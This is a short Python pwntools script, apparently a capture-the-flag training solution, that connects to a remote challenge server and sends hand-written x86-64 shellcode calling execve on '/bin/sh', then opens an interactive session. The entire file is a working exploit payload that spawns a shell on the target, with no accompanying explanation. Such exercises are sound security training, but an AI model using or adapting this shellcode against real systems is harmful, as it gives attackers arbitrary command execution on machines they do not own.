from pwn import *

context.terminal = ['tmux', 'splitw' ,'-h']

#r = process("./backtoshell")

#gdb.attach(r, """b main
#""")

r = remote("training.jinblack.it", 3001)

shellcode = b"\x48\x83\xC0\x23\x48\x89\xC7\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05"

shellcode = shellcode + b"\x00\x00\x00\x00\x00/bin/sh\x00"

r.send(shellcode)

r.interactive()
